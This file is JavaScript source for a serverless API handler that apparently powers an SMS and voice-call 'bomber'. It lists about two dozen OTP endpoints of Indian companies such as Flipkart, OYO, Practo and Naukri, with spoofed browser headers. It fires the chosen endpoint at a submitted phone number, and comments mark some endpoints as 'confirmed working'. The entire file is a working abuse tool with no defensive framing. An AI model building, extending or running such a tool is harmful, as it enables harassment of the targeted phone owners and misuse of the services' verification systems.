// ═══════════════════════════════════════════════════════════════════
//  USER AGENTS
// ═══════════════════════════════════════════════════════════════════
const UA_MOBILE = 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36';
const UA_DESKTOP = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

// ═══════════════════════════════════════════════════════════════════
//  ENDPOINT REGISTRY — type: 'sms' | 'call'
// ═══════════════════════════════════════════════════════════════════
const ENDPOINTS = [
  // ═══════════════ CALL / VOICE ENDPOINTS (5) ═════════════════════
  {
    id: 'magicbricks_call',
    type: 'call',
    method: 'GET',
    url: n => `https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=${n}`,
    headers: {
      'User-Agent': UA_DESKTOP,
      'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
      'Referer': 'https://www.magicbricks.com/'
    }
  },
  {
    id: 'myupchar_call',
    type: 'call',
    method: 'GET',
    url: n => `https://www.myupchar.com/user_profile/resend_otp_via_voice?id=${n}`,
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Referer': 'https://www.myupchar.com/'
    }
  },
  {
    id: 'oyo_call',
    type: 'call',
    method: 'GET',
    url: n => `https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone=${n}&type=voice`,
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://www.oyorooms.com',
      'Referer': 'https://www.oyorooms.com/'
    }
  },
  {
    id: 'flipkart_call',
    type: 'call',
    method: 'POST',
    url: 'https://www.flipkart.com/api/5/user/voice/otp/generate',
    headers: {
      'User-Agent': UA_DESKTOP,
      'Accept': '*/*',
      'Origin': 'https://www.flipkart.com',
      'Referer': 'https://www.flipkart.com/',
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop'
    },
    body: n => `loginId=%2B91${n}&state=VERIFIED`
  },
  {
    id: 'makaan_call',
    type: 'call',
    method: 'GET',
    url: n => `https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/${n}?callType=otpOnCall`,
    headers: {
      'User-Agent': UA_DESKTOP,
      'Accept': 'application/json, text/plain, */*',
      'Referer': 'https://www.makaan.com/'
    }
  },

  // ═══════════════ SMS ENDPOINTS — CONFIRMED WORKING (7) ══════════
  {
    id: 'oyo_sms',
    type: 'sms',
    method: 'GET',
    url: n => `https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone=${n}`,
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://www.oyorooms.com',
      'Referer': 'https://www.oyorooms.com/'
    }
  },
  {
    id: 'delhivery',
    type: 'sms',
    method: 'GET',
    url: n => `https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=${n}`,
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://direct.delhivery.com',
      'Referer': 'https://direct.delhivery.com/'
    }
  },
  {
    id: 'practo',
    type: 'sms',
    method: 'POST',
    url: 'https://accounts.practo.com/send_otp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-DROID-VERSION': '4.12.5',
      'API-Version': '2.0',
      'client-version': 'Android-4.12.5',
      'X-DROID-VERSION-CODE': '158',
      'client-name': 'Practo Android App'
    },
    body: n => `client_name=Practo+Android+App&fingerprint=&mobile=%2B91${n}&device_name=samsung+SM-G9350`
  },
  {
    id: 'realestateindia',
    type: 'sms',
    method: 'POST',
    url: 'https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'text/html, */*; q=0.01',
      'Origin': 'https://www.realestateindia.com',
      'Referer': 'https://www.realestateindia.com/thanks.php?newreg',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest'
    },
    body: n => `action_id=call_to_otp&mob_num=${n}&member_id=1547045`
  },
  {
    id: 'flipkart_form',
    type: 'sms',
    method: 'POST',
    url: 'https://www.flipkart.com/api/5/user/otp/generate',
    headers: {
      'User-Agent': UA_DESKTOP,
      'Accept': '*/*',
      'Origin': 'https://www.flipkart.com',
      'Referer': 'https://www.flipkart.com/',
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop'
    },
    body: n => `loginId=%2B91${n}&state=VERIFIED&churnEmailRequest=false`
  },

  // ═══════════════ SMS ENDPOINTS — NEW ATTEMPTS (13) ══════════════
  {
    id: 'naukri',
    type: 'sms',
    method: 'POST',
    url: 'https://www.naukri.com/api/v1/otp/generate',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://www.naukri.com',
      'Referer': 'https://www.naukri.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ mobile: n, type: 'sms' })
  },
  {
    id: 'quikr',
    type: 'sms',
    method: 'POST',
    url: 'https://api.quikr.com/relay/otp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.quikr.com',
      'Referer': 'https://www.quikr.com/',
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: n => `number=${n}&type=signup`
  },
  {
    id: 'snapdeal',
    type: 'sms',
    method: 'POST',
    url: 'https://www.snapdeal.com/api/1.0/user/send-otp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.snapdeal.com',
      'Referer': 'https://www.snapdeal.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ phoneNumber: n, type: 'sms' })
  },
  {
    id: 'tata_1mg',
    type: 'sms',
    method: 'POST',
    url: 'https://www.1mg.com/api/otp/send',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.1mg.com',
      'Referer': 'https://www.1mg.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ phone: n })
  },
  {
    id: 'penpencil',
    type: 'sms',
    method: 'POST',
    url: 'https://api.penpencil.co/v3/otp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.pw.live',
      'Referer': 'https://www.pw.live/',
      'Content-Type': 'application/json',
      'client-id': '5eb393ee95fab7468a79d189',
      'client-type': 'WEB'
    },
    body: n => JSON.stringify({ username: n, countryCode: '+91' })
  },
  {
    id: 'healthkart',
    type: 'sms',
    method: 'POST',
    url: 'https://api.healthkart.com/v1/otp/send',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.healthkart.com',
      'Referer': 'https://www.healthkart.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ mobile: n })
  },
  {
    id: 'tata_neu',
    type: 'sms',
    method: 'POST',
    url: 'https://neu.tatadigital.com/api/v1/otp/send',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.tataneu.com',
      'Referer': 'https://www.tataneu.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ phone: n, countryCode: '+91' })
  },
  {
    id: 'urbancompany',
    type: 'sms',
    method: 'POST',
    url: 'https://www.urbancompany.com/api/auth/sendOtp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.urbancompany.com',
      'Referer': 'https://www.urbancompany.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ phone: n })
  },
  {
    id: 'meesho_form',
    type: 'sms',
    method: 'POST',
    url: 'https://api.meesho.com/api/v1/auth/sendOtp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.meesho.com',
      'Referer': 'https://www.meesho.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ mobile: n })
  },
  {
    id: 'jiomart',
    type: 'sms',
    method: 'POST',
    url: 'https://www.jiomart.com/api/v1/auth/otp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.jiomart.com',
      'Referer': 'https://www.jiomart.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ mobile: n })
  },
  {
    id: 'hindustantimes',
    type: 'sms',
    method: 'POST',
    url: 'https://www.hindustantimes.com/api/v1/otp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.hindustantimes.com',
      'Referer': 'https://www.hindustantimes.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ mobile: n })
  },
  {
    id: 'adda247',
    type: 'sms',
    method: 'POST',
    url: 'https://api.adda247.com/api/v1/sendOtp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.adda247.com',
      'Referer': 'https://www.adda247.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ mobile: n })
  },
  {
    id: 'maruti_suzuki',
    type: 'sms',
    method: 'POST',
    url: 'https://www.marutisuzuki.com/api/otp/generate',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.marutisuzuki.com',
      'Referer': 'https://www.marutisuzuki.com/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ mobile: n })
  }
];

// ═══════════════════════════════════════════════════════════════════
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type'
};

function validNumber(n) {
  return typeof n === 'string' && /^[6-9]\d{9}$/.test(n);
}

function validEndpointId(id) {
  return ENDPOINTS.some(e => e.id === id);
}

// ═══════════════════════════════════════════════════════════════════
//  FIRE ENDPOINT
// ═══════════════════════════════════════════════════════════════════
async function fireEndpoint(endpoint, phone) {
  const start = Date.now();
  const url = typeof endpoint.url === 'function' ? endpoint.url(phone) : endpoint.url;
  const body = endpoint.body ? endpoint.body(phone) : undefined;

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 3500);

  try {
    const res = await fetch(url, {
      method: endpoint.method,
      headers: endpoint.headers,
      body,
      signal: controller.signal,
      redirect: 'follow'
    });

    clearTimeout(timeoutId);

    return {
      ok: res.status >= 200 && res.status < 300,
      status: res.status,
      latencyMs: Date.now() - start
    };
  } catch (err) {
    clearTimeout(timeoutId);

    return {
      ok: false,
      status: err.name === 'AbortError' ? 'timeout' : 'network_error',
      error: err.message,
      latencyMs: Date.now() - start
    };
  }
}

// ═══════════════════════════════════════════════════════════════════
//  HANDLER
// ═══════════════════════════════════════════════════════════════════
export default async function handler(req, res) {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, CORS);
    return res.end();
  }

  for (const [k, v] of Object.entries(CORS)) res.setHeader(k, v);

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'method_not_allowed' });
  }

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { body = {}; }
  }
  body = body || {};

  const { endpointId, phone } = body;

  if (!validNumber(phone)) {
    return res.status(400).json({ ok: false, error: 'invalid_phone' });
  }

  if (!validEndpointId(endpointId)) {
    return res.status(400).json({ ok: false, error: 'invalid_endpoint' });
  }

  const endpoint = ENDPOINTS.find(e => e.id === endpointId);
  const result = await fireEndpoint(endpoint, phone);

  return res.status(200).json({
    ok: result.ok,
    endpoint: endpoint.id,
    type: endpoint.type,
    upstreamStatus: result.status,
    latencyMs: result.latencyMs,
    error: result.error
  });
}

export const config = {
  api: { bodyParser: { sizeLimit: '1kb' } }
};
